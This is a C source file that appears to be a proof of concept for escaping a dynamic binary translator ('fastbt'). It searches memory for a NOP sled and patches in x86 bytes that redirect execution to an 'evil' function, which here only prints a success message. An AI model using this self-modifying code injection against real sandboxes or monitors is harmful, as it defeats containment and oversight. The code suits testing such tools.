#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void breakout()
{

char *hint;
char *tmp;
int i, j;

hint = 0xb751d200;
printf("hint = %x\n", hint);

/*
posix_memalign((void*)&hint, sysconf(_SC_PAGESIZE), sysconf(_SC_PAGESIZE));
printf("*hint = %x\n", hint);
*/

/*
for(j = 0; j < 5; j++)
{
posix_memalign((void*)&tmp, sysconf(_SC_PAGESIZE), sysconf(_SC_PAGESIZE));
printf("*tmp = %x\n", tmp);
}
*/

printf("searching for nops...\n");

for(i = 0; i < 500; i++)
{

 for(j = 0; j < 10; j++)
 {
  if(*(hint+i+j) != '\x90') break;
 }

 if(j > 9)
 {
  printf("10 nops found @ %x\n", (hint+i));

  //80483c3:       b8 d4 82 04 08          mov    $0x80482d4,%eax
  //80483c8:       ff d0                   call   *%eax
  // evil @ 0x080485e9

  tmp = hint + i;
  *tmp++ = '\xb8';
  *tmp++ = '\xf9';
  *tmp++ = '\x85';
  *tmp++ = '\x04';
  *tmp++ = '\x08';
  *tmp++ = '\xff';
  *tmp++ = '\xd0';

  return;
 }

}

} // end of breakout

void nops() // has to be long enough so it doesn't get inlined by fastbt
{

asm(
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
"nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;"
);

}

void evil()
{
 printf("breakout succeeded!\n");
 _exit(0);
}

int main()
{
 printf("sleeping...\n");
 sleep(2);

 nops();
 breakout();
 nops();

 printf("sleeping...\n");
 sleep(2);

 return 0;
}
